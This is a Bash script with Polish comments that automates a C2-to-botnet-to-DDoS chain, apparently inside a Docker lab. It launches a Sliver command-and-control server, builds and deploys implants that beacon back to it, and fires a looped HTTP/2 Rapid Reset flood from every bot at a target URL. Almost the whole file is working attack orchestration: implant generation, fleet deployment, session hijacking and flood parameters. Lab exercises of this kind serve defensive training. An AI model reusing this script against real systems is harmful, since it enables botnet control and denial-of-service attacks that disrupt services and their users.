#!/usr/bin/env bash
# =============================================================================
# C2 (Sliver) → botnet → Rapid Reset   — JEDNA KOMENDA
# =============================================================================
# Automatyzuje pełny scenariusz ofensywny:
#   1. uruchamia serwer Sliver w kontenerze c2 (konsola sterowana przez FIFO),
#   2. startuje listener mTLS,
#   3. generuje implanta linux (lub używa z cache: c2/data/botimplant),
#   4. wgrywa implanta + skrypt ataku na flotę botów i uruchamia implanty,
#   5. czeka aż implanty zgłoszą się jako sesje w Sliverze,
#   6. komendą `execute` z C2 odpala Rapid Reset na CAŁEJ flocie naraz,
#   7. zrzuca dowód (lista sesji) do c2-proof.txt.
#
# WYMAGANIA:
#   - docker compose up -d --build        (sieć labnet + c2 + obraz bota)
#   - flota botów lab-bot1..N             (tworzy ją run-botnet-matrix.sh,
#                                          albo: docker run -d --name lab-botK
#                                          --network ddos-lab_labnet ddos-lab-bot)
#   - binarka Slivera w c2/bin/sliver-server (patrz HANDOVER.md)
#
# PARAMETRY (env):
#   FLEET=5            ile botów zaatakuje (lab-bot1..FLEET)
#   DURATION=120       czas ataku [s]
#   TARGET=https://victim:443
#   BUILD_TIMEOUT=900  ile czekać na kompilację implanta [s] (Go build bywa wolny;
#                      na słabym CPU >8 min — na mocnym kilka min; wynik jest cache'owany)
#
# UWAGA: pierwszy `generate` kompiluje implanta (Go) — to jedyny wolny krok.
#   Na słabym hoście może nie zdążyć; wtedy podnieś BUILD_TIMEOUT. Po zbudowaniu
#   implant leży w c2/data/botimplant i kolejne uruchomienia są szybkie.
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true

HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"
C2DATA="$ROOT/c2/data"
PROOF="$HERE/../data/c2-proof.txt"; mkdir -p "$(dirname "$PROOF")"

FLEET="${FLEET:-5}"; DURATION="${DURATION:-120}"; TARGET="${TARGET:-https://victim:443}"
C2="${C2:-lab-c2}"; LPORT="${LPORT:-8888}"; BUILD_TIMEOUT="${BUILD_TIMEOUT:-900}"

send(){ docker exec "$C2" sh -c "printf '%s\n' \"$1\" > /tmp/sin"; }
sout(){ docker exec "$C2" sh -c "sed 's/\x1b\[[0-9;]*m//g' /tmp/sliver.out 2>/dev/null"; }
say(){ echo "[c2] $*"; }

# --- 0. czysty start serwera (restart c2 kasuje zombie/porty) ---
say "restart kontenera c2 (czysty stan)"
docker restart "$C2" >/dev/null; sleep 4
say "start serwera Sliver + FIFO"
docker exec -d "$C2" sh -c 'rm -f /tmp/sin; mkfifo /tmp/sin; (sleep infinity > /tmp/sin &); /opt/sliver/sliver-server < /tmp/sin > /tmp/sliver.out 2>&1'
sleep 12

# --- 1. listener mTLS ---
say "listener mTLS :$LPORT"
send "mtls --lport $LPORT"; sleep 5

# --- 2. implant: zbuduj W KONTENERZE c2, wyciagnij przez `docker cp`
#     (omija prawa hosta do zamontowanego c2/data — plik jest root-owned) ---
IMPL_C2="/root/.sliver/botimplant"
if docker exec "$C2" test -f "$IMPL_C2" 2>/dev/null; then
  say "implant juz istnieje w kontenerze c2"
else
  say "generuję implanta linux (Go build — to potrwa, max ${BUILD_TIMEOUT}s)"
  send "generate --mtls $C2:$LPORT --os linux --skip-symbols --name botimplant --save $IMPL_C2"
  t=0; while ! docker exec "$C2" test -f "$IMPL_C2" 2>/dev/null && [ $t -lt "$BUILD_TIMEOUT" ]; do sleep 5; t=$((t+5)); [ $((t%30)) -eq 0 ] && say "  ...build ${t}s"; done
fi
docker exec "$C2" test -f "$IMPL_C2" 2>/dev/null || { say "BŁĄD: implant nie zbudowany w ${BUILD_TIMEOUT}s (podnieś BUILD_TIMEOUT)"; exit 1; }
docker cp "$C2:$IMPL_C2" /tmp/botimplant >/dev/null 2>&1
chmod +x /tmp/botimplant 2>/dev/null
say "implant gotowy ($(wc -c < /tmp/botimplant) B)"

# --- 3. skrypt ataku dla botów (Rapid Reset w pętli, w tle) ---
cat > /tmp/c2_attack.sh <<'ATK'
#!/bin/sh
nohup sh -c 'end=$(( $(date +%s)+__DUR__ )); while [ $(date +%s) -lt $end ]; do rapidreset -url __TARGET__ -requests 20000 -concurrency 1000 >/dev/null 2>&1; done' >/dev/null 2>&1 &
echo ATTACK_STARTED
ATK
sed -i "s|__TARGET__|$TARGET|g; s|__DUR__|$DURATION|g" /tmp/c2_attack.sh

# --- 4. deploy implanta + ataku na flotę, uruchom implanty ---
say "deploy na flotę lab-bot1..$FLEET i start implantów"
for b in $(seq 1 "$FLEET"); do
  docker cp /tmp/botimplant      "lab-bot$b:/implant"  >/dev/null 2>&1
  docker cp /tmp/c2_attack.sh    "lab-bot$b:/attack.sh" >/dev/null 2>&1
  docker exec "lab-bot$b" chmod +x /implant /attack.sh 2>/dev/null
  docker exec -d "lab-bot$b" /implant                  # implant beaconuje do c2 (mTLS)
done

# --- 5. czekaj na sesje ---
# Wiersz sesji w tabeli Sliver ma ID (8 hex) w 1. kolumnie i transport 'mtls'.
say "czekam na sesje implantów..."
t=0; IDS=""
while [ $t -lt 90 ]; do
  send "sessions"; sleep 3
  IDS=$(sout | grep -i 'mtls' | awk '{print $1}' | grep -iE '^[0-9a-f]{8}$' | sort -u)
  [ -n "$IDS" ] && break
  t=$((t+5)); sleep 2
done
NSESS=$(echo "${IDS:-}" | grep -c .)
say "sesje: $NSESS"

# --- 6. execute Rapid Reset na każdej sesji (atak z C2) ---
if [ -n "${IDS:-}" ]; then
  for id in $IDS; do
    say "execute -> sesja $id"
    send "use $id"; sleep 1
    send "execute /attack.sh"; sleep 1
  done
else
  say "UWAGA: nie sparsowano ID sesji (format tabeli może różnić się w Twojej wersji Sliver)."
  say "       Odpal ręcznie w konsoli: docker compose exec c2 /opt/sliver/sliver-server"
  say "       potem: sessions ; use <ID> ; execute /attack.sh   (dla każdego bota)"
fi

# --- 7. dowód ---
send "sessions"; sleep 2
{ echo "=== C2 Sliver — dowód sterowania botnetem ==="; date;
  echo "Cel: $TARGET  | flota: $FLEET  | czas: ${DURATION}s"; echo;
  sout | tail -40; } > "$PROOF"
say "atak odpalony. Dowód (lista sesji) -> $PROOF"
say "obserwuj ofiarę: Zabbix (Nginx Connections active / CPU) lub: docker exec lab-victim2 ..."
